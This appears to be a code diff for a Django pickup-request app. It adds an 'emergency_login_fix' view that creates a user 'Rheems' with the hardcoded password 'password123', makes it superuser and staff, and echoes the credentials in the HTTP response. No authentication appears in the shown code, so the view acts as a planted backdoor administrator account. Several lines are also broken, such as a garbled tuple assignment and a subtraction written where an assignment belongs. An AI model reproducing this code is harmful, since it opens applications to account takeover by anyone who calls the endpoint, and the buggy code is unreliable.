@@ -8,7 +8,19 @@ import secrets
 import pickup.serializers as serializers
 from .models import PickupRequest, ConfirmationCode, ConfirmationCodeLog
 from .serializers import PickupRequestSerializer, ConfirmationCodeSerializer
+from django.contrib.auth.models import User
+from django.http import HttpResponse
 
+
+def emergency_login_fix(request):
+    #this finds your user and forces password to 'password123'
+
+    u.created = User.objects.get_or_create(username='Rheems')
+    u.set_password('password123')
+    u.is_superuser - True
+    u.is_staff = True
+    u.save()
+    return HttpResponse("Password reset to 'password123' for user 'Rheems' ")
 
 # CREATE PICKUP REQUEST
 @api_view(['POST'])
